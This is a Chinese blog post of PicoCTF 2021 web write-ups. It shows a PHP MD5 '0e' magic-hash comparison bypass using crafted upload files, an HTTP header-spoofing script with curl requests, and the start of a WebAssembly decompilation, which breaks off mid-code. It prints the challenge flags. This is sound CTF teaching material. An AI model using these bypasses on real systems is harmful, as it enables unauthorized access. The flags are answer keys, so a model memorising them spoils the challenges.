<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#6200ee"><meta name="author" content="m0re"><meta name="copyright" content="m0re"><meta name="generator" content="Hexo 5.1.0"><meta name="theme" content="hexo-theme-yun"><title>PicoCTF2021_Web(二) | m0re的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.24/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_j5gk85dg4pf.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>document.addEventListener("DOMContentLoaded", () => {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
});
</script><link id="light-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism.css" media="(prefers-color-scheme: light)"><link id="dark-prism-css" rel="stylesheet" href="https://cdn.jsdelivr.net/npm/prismjs@latest/themes/prism-tomorrow.css" media="(prefers-color-scheme: dark)"><link rel="icon" href="/m0re.ico"><link rel="mask-icon" href="/m0re.ico" color="#6200ee"><link rel="alternate icon" href="/yun.ico"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"m0re.top","root":"/","title":"人生路漫漫","version":"1.6.1","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://v1.hitokoto.cn","hitokoto":true},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><meta name="description" content="比起晴空万里，我更需要你">
<meta property="og:type" content="article">
<meta property="og:title" content="PicoCTF2021_Web(二)">
<meta property="og:url" content="https://m0re.top/posts/3246d33f/index.html">
<meta property="og:site_name" content="m0re的小站">
<meta property="og:description" content="比起晴空万里，我更需要你">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/v2-e4c3f97559a3d4655aa5ffe2eaf52d72_r.jpg">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210808190627805.png">
<meta property="og:image" content="https://gitee.com/m0re/picture/raw/master/img/image-20210808224822301.png">
<meta property="article:published_time" content="2021-08-08T15:09:42.802Z">
<meta property="article:modified_time" content="2021-08-08T15:09:16.648Z">
<meta property="article:author" content="m0re">
<meta property="article:tag" content="CTF题记">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://gitee.com/m0re/picture/raw/master/img/v2-e4c3f97559a3d4655aa5ffe2eaf52d72_r.jpg"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="m0re"><img width="96" loading="lazy" src="/images/avatar.jpg" alt="m0re"><span class="site-author-status" title="穷鬼啊啊啊啊">😭</span></a><div class="site-author-name"><a href="/about/">m0re</a></div><span class="site-name">m0re的小站</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">104</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">12</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">43</span></a></div><a class="site-state-item hty-icon-button" href="/Tools/" title="Tools"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-settings-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/zxcv0221" title="GitHub" target="_blank" style="color:#181717"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-github-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" title="哔哩哔哩动画" target="_blank" style="color:#FF8EB3"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-bilibili-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://twitter.com/ISm0r3" title="Twitter" target="_blank" style="color:#1da1f2"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-twitter-line"></use></svg></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:m0re.lxj@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-mail-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#It-is-my-Birthday"><span class="toc-number">1.</span> <span class="toc-text">It is my Birthday</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Who-are-you"><span class="toc-number">2.</span> <span class="toc-text">Who are you?</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Some-Assembly-Required-2"><span class="toc-number">3.</span> <span class="toc-text">Some Assembly Required 2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Super-Serial"><span class="toc-number">4.</span> <span class="toc-text">Super Serial</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#X-marks-the-spot"><span class="toc-number">5.</span> <span class="toc-text">X marks the spot</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#end"><span class="toc-number">6.</span> <span class="toc-text">end</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="https://m0re.top/posts/3246d33f/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="m0re"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="m0re的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">PicoCTF2021_Web(二)</h1><div class="post-meta"><div class="post-time" style="display:inline-block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <span class="post-meta-icon-text">发表于</span> <time title="创建时间：2021-08-08 23:09:42" itemprop="dateCreated datePublished" datetime="2021-08-08T23:09:42+08:00">2021-08-08</time></div><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span id="busuanzi_value_page_pv"></span></span></span><span class="leancloud_visitors" id="/posts/3246d33f/" data-flag-title="PicoCTF2021_Web(二)"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-eye-line"></use></svg> <span class="leancloud-visitors-count"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-line"></use></svg></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/CTF%E9%A2%98%E8%AE%B0/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">CTF题记</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/CTF%E9%A2%98%E8%AE%B0/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">CTF题记</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#6200ee;"><p><img src="https://gitee.com/m0re/picture/raw/master/img/v2-e4c3f97559a3d4655aa5ffe2eaf52d72_r.jpg" loading="lazy"></p>
<p>比起晴空万里，我更需要你</p>
<a id="more"></a>

<h1 id="It-is-my-Birthday"><a href="#It-is-my-Birthday" class="headerlink" title="It is my Birthday"></a>It is my Birthday</h1><blockquote>
<p>描述：I sent out 2 invitations to all of my friends for my birthday! I’ll know if they get stolen because the two invites look similar, and they even have the same md5 hash, but they are slightly different! You wouldn’t believe how long it took me to find a collision. Anyway, see if you’re invited by submitting 2 PDFs to my website.</p>
<p>Hints:</p>
<pre><code>    1. Look at the category of this problem.
      2. How may a PHP site check the rules in the description?</code></pre>
</blockquote>
<p>网站打开也是可以看到<br><img src="https://gitee.com/m0re/picture/raw/master/img/image-20210808190627805.png" alt="image-20210808190627805" loading="lazy"></p>
<p>上传功能，而且根据题目描述，需要上传的是两个PDF文件，且他们的md5哈希值要相同。这个一开始看很懵，怎么控制文件的md5值相同。</p>
<blockquote>
<p>PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。</p>
</blockquote>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># echo -n "s878926199a" > ctf1.pdf</span>
                                                                                                                                      
┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># echo -n "s1665632922a" > ctf2.pdf</span>
                                                                                                                                      
┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># md5sum ctf1.pdf ctf2.pdf </span>
0e545993274517709034328855841020  ctf1.pdf
0e731198061491163073197128363787  ctf2.pdf</code></pre>

<p>所以上传这两个文件即可，保证他们的md5值均为0，即可绕过PHP中的弱类型的md5绕过。符合第二个hint<br>拿到了源码</p>
<pre class="language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?php

if (isset($_POST[&quot;submit&quot;])) &#123;
    $type1 &#x3D; $_FILES[&quot;file1&quot;][&quot;type&quot;];
    $type2 &#x3D; $_FILES[&quot;file2&quot;][&quot;type&quot;];
    $size1 &#x3D; $_FILES[&quot;file1&quot;][&quot;size&quot;];
    $size2 &#x3D; $_FILES[&quot;file2&quot;][&quot;size&quot;];
    $SIZE_LIMIT &#x3D; 18 * 1024;

    if (($size1 &lt; $SIZE_LIMIT) &amp;&amp; ($size2 &lt; $SIZE_LIMIT)) &#123;
        if (($type1 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;) &amp;&amp; ($type2 &#x3D;&#x3D; &quot;application&#x2F;pdf&quot;)) &#123;
            $contents1 &#x3D; file_get_contents($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]);
            $contents2 &#x3D; file_get_contents($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;]);

            if ($contents1 !&#x3D; $contents2) &#123;
                if (md5_file($_FILES[&quot;file1&quot;][&quot;tmp_name&quot;]) &#x3D;&#x3D; md5_file($_FILES[&quot;file2&quot;][&quot;tmp_name&quot;])) &#123;
                    highlight_file(&quot;index.php&quot;);
                    die();
                &#125; else &#123;
                    echo &quot;MD5 hashes do not match!&quot;;
                    die();
                &#125;
            &#125; else &#123;
                echo &quot;Files are not different!&quot;;
                die();
            &#125;
        &#125; else &#123;
            echo &quot;Not a PDF!&quot;;
            die();
        &#125;
    &#125; else &#123;
        echo &quot;File too large!&quot;;
        die();
    &#125;
&#125;

&#x2F;&#x2F; FLAG: picoCTF&#123;c0ngr4ts_u_r_1nv1t3d_aad886b9&#125;

?&gt;
&lt;!DOCTYPE html&gt;
&lt;html lang&#x3D;&quot;en&quot;&gt;

&lt;head&gt;
    &lt;title&gt;It is my Birthday&lt;&#x2F;title&gt;


    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.2.0&#x2F;css&#x2F;bootstrap.min.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;

    &lt;link href&#x3D;&quot;https:&#x2F;&#x2F;getbootstrap.com&#x2F;docs&#x2F;3.3&#x2F;examples&#x2F;jumbotron-narrow&#x2F;jumbotron-narrow.css&quot; rel&#x3D;&quot;stylesheet&quot;&gt;

    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;jquery&#x2F;3.3.1&#x2F;jquery.min.js&quot;&gt;&lt;&#x2F;script&gt;

    &lt;script src&#x3D;&quot;https:&#x2F;&#x2F;maxcdn.bootstrapcdn.com&#x2F;bootstrap&#x2F;3.3.7&#x2F;js&#x2F;bootstrap.min.js&quot;&gt;&lt;&#x2F;script&gt;


&lt;&#x2F;head&gt;

&lt;body&gt;

    &lt;div class&#x3D;&quot;container&quot;&gt;
        &lt;div class&#x3D;&quot;header&quot;&gt;
            &lt;h3 class&#x3D;&quot;text-muted&quot;&gt;It is my Birthday&lt;&#x2F;h3&gt;
        &lt;&#x2F;div&gt;
        &lt;div class&#x3D;&quot;jumbotron&quot;&gt;
            &lt;p class&#x3D;&quot;lead&quot;&gt;&lt;&#x2F;p&gt;
            &lt;div class&#x3D;&quot;row&quot;&gt;
                &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;
                    &lt;h3&gt;See if you are invited to my party!&lt;&#x2F;h3&gt;
                &lt;&#x2F;div&gt;
            &lt;&#x2F;div&gt;
            &lt;br&#x2F;&gt;
            &lt;div class&#x3D;&quot;upload-form&quot;&gt;
                &lt;form role&#x3D;&quot;form&quot; action&#x3D;&quot;&#x2F;index.php&quot; method&#x3D;&quot;post&quot; enctype&#x3D;&quot;multipart&#x2F;form-data&quot;&gt;
                &lt;div class&#x3D;&quot;row&quot;&gt;
                    &lt;div class&#x3D;&quot;form-group&quot;&gt;
                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file1&quot; id&#x3D;&quot;file1&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;
                        &lt;input type&#x3D;&quot;file&quot; name&#x3D;&quot;file2&quot; id&#x3D;&quot;file2&quot; class&#x3D;&quot;form-control input-lg&quot;&gt;
                    &lt;&#x2F;div&gt;
                &lt;&#x2F;div&gt;
                &lt;div class&#x3D;&quot;row&quot;&gt;
                    &lt;div class&#x3D;&quot;col-xs-12 col-sm-12 col-md-12&quot;&gt;
                        &lt;input type&#x3D;&quot;submit&quot; class&#x3D;&quot;btn btn-lg btn-success btn-block&quot; name&#x3D;&quot;submit&quot; value&#x3D;&quot;Upload&quot;&gt;
                    &lt;&#x2F;div&gt;
                &lt;&#x2F;div&gt;
                &lt;&#x2F;form&gt;
            &lt;&#x2F;div&gt;
        &lt;&#x2F;div&gt;
    &lt;&#x2F;div&gt;
    &lt;footer class&#x3D;&quot;footer&quot;&gt;
        &lt;p&gt;&amp;copy; PicoCTF&lt;&#x2F;p&gt;
    &lt;&#x2F;footer&gt;

&lt;&#x2F;div&gt;

&lt;script&gt;
$(document).ready(function()&#123;
    $(&quot;.close&quot;).click(function()&#123;
        $(&quot;myAlert&quot;).alert(&quot;close&quot;);
    &#125;);
&#125;);
&lt;&#x2F;script&gt;
&lt;&#x2F;body&gt;

&lt;&#x2F;html&gt;</code></pre>

<p>大佬的做法是</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># curl -F 'file1=@ctf1.pdf' -F 'file2=@ctf2.pdf' -F 'submit=Upload' http://mercury.picoctf.net:55343/ -s | egrep -o "picoCTF&#123;[^&#125;]+&#125;"</span>
picoCTF<span class="token punctuation">&#123;</span>c0ngr4ts_u_r_1nv1t3d_aad886b9<span class="token punctuation">&#125;</span></code></pre>

<h1 id="Who-are-you"><a href="#Who-are-you" class="headerlink" title="Who are you?"></a>Who are you?</h1><p>假猪套，不细说。<br>脚本：</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
url <span class="token operator">=</span> <span class="token string">"http://mercury.picoctf.net:46199/"</span>

headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token string">"Host"</span><span class="token punctuation">:</span> <span class="token string">"mercury.picoctf.net:46199"</span><span class="token punctuation">,</span>
    <span class="token string">"User-Agent"</span><span class="token punctuation">:</span> <span class="token string">"PicoBrowser"</span><span class="token punctuation">,</span>
    <span class="token string">"Accept-Language"</span><span class="token punctuation">:</span> <span class="token string">"sv-sv"</span><span class="token punctuation">,</span>
    <span class="token string">"X-Forwarded-For"</span><span class="token punctuation">:</span> <span class="token string">"31.15.32.0"</span><span class="token punctuation">,</span>
    <span class="token string">"DNT"</span><span class="token punctuation">:</span> <span class="token string">"1"</span><span class="token punctuation">,</span>
    <span class="token string">"Referer"</span><span class="token punctuation">:</span> <span class="token string">"http://mercury.picoctf.net:46199"</span><span class="token punctuation">,</span>
    <span class="token string">"Date"</span><span class="token punctuation">:</span> <span class="token string">"2018"</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span>
r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
<span class="token comment"># print(r.text)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">"&lt;/b>"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre>

<p>POC： </p>
<pre class="language-http" data-language="http"><code class="language-http">GET / HTTP/1.1
<span class="token header-name keyword">Host:</span> mercury.picoctf.net:46199
<span class="token header-name keyword">User-Agent:</span> PicoBrowser
<span class="token header-name keyword">Accept:</span> text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
<span class="token header-name keyword">Accept-Language:</span> sv-sv
<span class="token header-name keyword">Accept-Encoding:</span> gzip, deflate
<span class="token header-name keyword">DNT:</span> 1
<span class="token header-name keyword">Connection:</span> close
<span class="token header-name keyword">Referer:</span> http://mercury.picoctf.net:46199
<span class="token header-name keyword">Date:</span> 2018
<span class="token header-name keyword">X-Forwarded-For:</span>193.150.233.115
<span class="token header-name keyword">Content-Length:</span> 4</code></pre>

<p>exp:</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root💀m0re<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/桌面/CTF<span class="token punctuation">]</span>
└─<span class="token comment"># curl --user-agent "picobrowser" "http://mercury.picoctf.net:46199/" --referer "http://mercury.picoctf.net:46199/" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 193.150.233.115" -H "Accept-Language: sv" -s | grep h3</span>
                                <span class="token operator">&lt;</span>h3 <span class="token assign-left variable">style</span><span class="token operator">=</span><span class="token string">"color:green"</span><span class="token operator">></span>What can I say except, you are welcome<span class="token operator">&lt;</span>/h<span class="token operator"><span class="token file-descriptor important">3</span>></span>
                        <span class="token operator">&lt;</span>b<span class="token operator">></span>picoCTF<span class="token punctuation">&#123;</span>http_h34d3rs_v3ry_c0Ol_much_w0w_8d5d8d77<span class="token punctuation">&#125;</span><span class="token operator">&lt;</span>/b<span class="token operator">></span></code></pre>

<h1 id="Some-Assembly-Required-2"><a href="#Some-Assembly-Required-2" class="headerlink" title="Some Assembly Required 2"></a>Some Assembly Required 2</h1><p>与Some Assembly Required 1类似，但是又有改进处。<br>这里开始使用了<code>wasm2wat</code>，但是没有像上一题那样得到flag。所以这次使用了<code>wasm-decompile</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">./wasm-decompile script.wasm -o script.dcmp </code></pre>

<p>结果如下：</p>
<pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">export</span> memory <span class="token function">memory</span><span class="token punctuation">(</span>initial<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> max<span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

global g_a<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">66864</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global input<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1072</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global dso_handle<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global data_end<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1328</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global global_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global heap_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">66864</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global memory_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token keyword">export</span> global table_base<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>

table T_a<span class="token operator">:</span><span class="token function">funcref</span><span class="token punctuation">(</span>min<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> max<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

data <span class="token function">d_xakgKNs989l1im8i890088k09nj9</span><span class="token punctuation">(</span>offset<span class="token operator">:</span> <span class="token number">1024</span><span class="token punctuation">)</span> <span class="token operator">=</span> 
<span class="token string">"xakgK\Ns9=8:9l1?im8i&lt;89?00>88k09=nj9kimnu\00\00"</span><span class="token punctuation">;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">wasm_call_ctors</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">export</span> <span class="token keyword">function</span> <span class="token function">strcmp</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token operator">:</span>int<span class="token punctuation">,</span> b<span class="token operator">:</span>int</span><span class="token punctuation">)</span><span class="token operator">:</span>int <span class="token punctuation">&#123;</span>
  <span class="token keyword">var</span> c<span class="token operator">:</span>int <span class="token operator">=</span> g_a<span class="token punctuation">;</span>
  <span class="token keyword">var</span> d<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span>
  <span class="token keyword">var</span> e<span class="token operator">:</span>int <span class="token operator">=</span> c <span class="token operator">-</span> d<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> a<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> b<span class="token punctuation">;</span>
  <span class="token keyword">var</span> f<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> f<span class="token punctuation">;</span>
  <span class="token keyword">var</span> g<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>
  e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> g<span class="token punctuation">;</span>
  loop L_b <span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> h<span class="token operator">:</span>ubyte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>
    <span class="token keyword">var</span> i<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> j<span class="token operator">:</span>int <span class="token operator">=</span> h <span class="token operator">+</span> i<span class="token punctuation">;</span>
    e<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> j<span class="token punctuation">;</span>
    <span class="token keyword">var</span> k<span class="token operator">:</span>int <span class="token operator">=</span> h<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>byte <span class="token operator">=</span> k<span class="token punctuation">;</span>
    <span class="token keyword">var</span> l<span class="token operator">:</span>ubyte_ptr <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int<span class="token punctuation">;</span>
    <span class="token keyword">var</span> m<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> n<span class="token operator">:</span>int <span class="token operator">=</span> l <span class="token operator">+</span> m<span class="token punctuation">;</span>
    e<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">:</span>int <span class="token operator">=</span> n<span class="token punctuation">;</span>
    <span class="token keyword">var</span> o<span class="token operator">:</span>int <span class="token operator">=</span> l<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    e<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token operator">:</span>byte <span class="token operator">=</span> o<span class="token punctuation">;</span>
    <span class="token keyword">var</span> p<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
    <span class="token keyword">var</span> q<span class="token operator">:</span>int <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span>
    <span class="token keyword">var</span> r<span class="token operator">:</span>int <span class="token operator">=</span> p <span class="token operator">&amp;</span> q<span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">)</span> goto B_c<span class="token punctuation">;</span>
    <span class="token keyword">var</span> s<span class="token operator">:</span>int <span class="token operator">=</span> e<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token operator">:</span>ubyte<span class="token punctuation">;</span>
